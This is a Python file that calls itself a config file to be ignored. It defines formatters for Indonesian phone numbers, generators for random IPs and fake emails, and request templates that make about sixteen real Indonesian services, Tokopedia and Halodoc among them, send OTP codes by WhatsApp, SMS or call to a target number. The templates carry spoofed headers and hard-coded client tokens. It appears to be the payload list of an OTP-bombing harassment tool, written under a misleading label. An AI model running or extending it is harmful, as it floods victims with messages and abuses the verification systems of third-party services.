# config file - abaikan
import random as _r, uuid as _u

def _f08(p): p=str(p).strip().replace(" ","").replace("-",""); return "0"+p[3:] if p.startswith("+62") else "0"+p[2:] if p.startswith("62") else p
def _f62(p): p=str(p).strip().replace(" ","").replace("-",""); return p[1:] if p.startswith("+") else "62"+p[1:] if p.startswith("0") else p
def _fplus(p): p=str(p).strip().replace(" ","").replace("-",""); return p if p.startswith("+62") else "+"+p if p.startswith("62") else "+62"+p[1:] if p.startswith("0") else "+62"+p
def _fnocode(p): p=str(p).strip().replace(" ","").replace("-",""); return p[3:] if p.startswith("+62") else p[2:] if p.startswith("62") else p[1:] if p.startswith("0") else p
def _rip(): return f"{_r.randint(1,255)}.{_r.randint(1,255)}.{_r.randint(1,255)}.{_r.randint(1,255)}"
_Q = "query OTPRequest($a:String!,$b:String,$c:String,$d:String,$e:Int){OTPRequest:OTPRequestV2(otpType:$a,mode:$b,msisdn:$c,email:$d,otpDigit:$e){success message errorMessage __typename}}"
_nm = lambda: _r.choice(["bayu","dimas","rudi","sinta","dewi","putri","eko","andi","rina","budi","citra","fajar","nita","agus","sari"])
_em = lambda: f"{_nm()}{_r.randint(10,99)}@gmail.com"

def _x(ph):
    return [
        ("Tokopedia-WA","https://gql.tokopedia.com/graphql/OTPRequest",{"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","Accept":"*/*","tokopedia-lite":"otp"},{"operationName":"OTPRequest","query":_Q,"variables":{"a":"116","b":"whatsapp","c":_f62(ph),"d":"","e":6}}),
        ("Tokopedia-SMS","https://gql.tokopedia.com/graphql/OTPRequest",{"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","Accept":"*/*","tokopedia-lite":"otp"},{"operationName":"OTPRequest","query":_Q,"variables":{"a":"116","b":"sms","c":_f62(ph),"d":"","e":6}}),
        ("Tokopedia-Call","https://gql.tokopedia.com/graphql/OTPRequest",{"Content-Type":"application/json","Origin":"https://www.tokopedia.com","Referer":"https://www.tokopedia.com/login","Accept":"*/*","tokopedia-lite":"otp"},{"operationName":"OTPRequest","query":_Q,"variables":{"a":"116","b":"phone","c":_f62(ph),"d":"","e":6}}),
        ("Fastwork","https://api.fastwork.id/auth/v2/signup.sendVerificationCode",{"Content-Type":"application/json","Origin":"https://auth2.fastwork.id"},{"phone_number":_f08(ph)}),
        ("BlibliTiket","https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/otp/generate",{"Content-Type":"text/plain;charset=UTF-8","Origin":"https://account.bliblitiket.com","x-request-id":str(_u.uuid4()),"x-channel-id":"MWEB","x-lang":"id","x-entity":"TIKET","x-client-id":"9dc79e3916a042abc86c2aa525bff009"},{"action":"REGISTER_OTP","channel":"WHATS_APP","recipient":_fplus(ph),"recaptchaToken":"","challengeToken":""}),
        ("Paper.id","https://register.paper.id/api/v1/auth/register/send-otp",{"Content-Type":"application/json","Origin":"https://paper.id","x-paper-user-agent":"multiverse/2.54.1 mobile_web (android) chrome"},{"phone":_f62(ph),"method":"whatsapp","registered_by":"web"}),
        ("Pluang","https://api-pluang.pluang.com/api/v3/user/signup/phone",{"Content-Type":"application/json","Origin":"https://pluang.com"},{"name":"M","email":_em(),"phone":_fplus(ph),"signature":"7cf092bcc024183a5b98b115469add78976a0acdc2a7a55769c983d9a344efe1","referral":"","messageMedium":"WHATSAPP_MESSAGE"}),
        ("Rumah123","https://www.rumah123.com/api/otp/request-otp",{"Content-Type":"application/json;charset=UTF-8","Origin":"https://www.rumah123.com","base-url-core":"https://www.rumah123.com"},{"cancelledRequestId":str(_u.uuid4()),"ipAddress":_rip(),"phoneNumber":_f62(ph),"portalId":1,"type":"WHATSAPP","url":"https://www.rumah123.com/user/login"}),
        ("Halodoc","https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests?clientToken=5a46f557bbabb198d46f00119c958ad0ddd25880508c1cc62337a8adac661af9",{"Content-Type":"application/json","Origin":"https://www.halodoc.com","Referer":"https://www.halodoc.com/login","Accept":"application/json","X-XSRF-TOKEN":"407054139ABF47819D36834033FBFEFC4A5EB2FA53417F3F0F266412CD5AB7EEC2A2338252CFD961937C8F335A3ADBF50740"},{"phone_number":_fplus(ph),"channel":"whatsapp","otp_resent":False,"clientId":"786fb676dc53480009296e0811229a7c"}),
        ("BonusBelanja","https://www.bonusbelanja.com/api/auth/registration/app",{"Content-Type":"application/json","Origin":"https://www.bonusbelanja.com","Referer":"https://www.bonusbelanja.com/register"},{"phone":_f62(ph),"name":"M","agreeTnc":True,"agreeContact":True}),
        ("DuniaGames","https://api.duniagames.co.id/api/user/api/v2/user/send-otp",{"Content-Type":"application/json","Origin":"https://duniagames.co.id","x-device":"85d3da46-4d56-4675-90fc-e27926c56de1"},{"phoneNumber":_fplus(ph),"userName":ph}),
        ("InternetRakyat","https://internetrakyat.id/api/app/auth/send-otp-register",{"Content-Type":"application/json"},{"phone_number":_f08(ph)}),
        ("MisterAladin","https://m.misteraladin.com/web-api/members/auth/otp-request",{"Content-Type":"application/json","Origin":"https://m.misteraladin.com"},{"phone_number":_fnocode(ph),"phone_number_country_code":62,"fullname":"M","pages":None,"type":"register"}),
        ("Matahari","https://matahari-backend-prod.matahari.com/api/auth/register",{"Content-Type":"application/json","Origin":"https://matahari.com"},{"emailAddress":_em(),"name":"T","mobileCountryCode":"","mobileNumber":_f08(ph),"birthDate":"2000-01-01","genderId":"1","password":"Test12345","cardNumber":"","referralCode":"","salesmanId":"","pickupStoreCode":"","marketingCode":""}),
        ("GreenSM","https://gapi.indo.greensm.com/car/acquisition/create-registration",{"Content-Type":"application/json","Origin":"https://indo.greensm.com"},{"HiringSource":"T","Education":"S","WorkExperience":"L","City":"JT","Type":"EXTERNAL","Tel":_fplus(ph),"Name":"W","Level":"","Country":"ID","ReferralCode":"","Source":"","AffiliateNumber":"","Campaign":""}),
        ("Vintar","https://vintar.id/api/merchant/auth/send-otp",{"Content-Type":"application/json"},{"phone":_f62(ph)}),
         ]
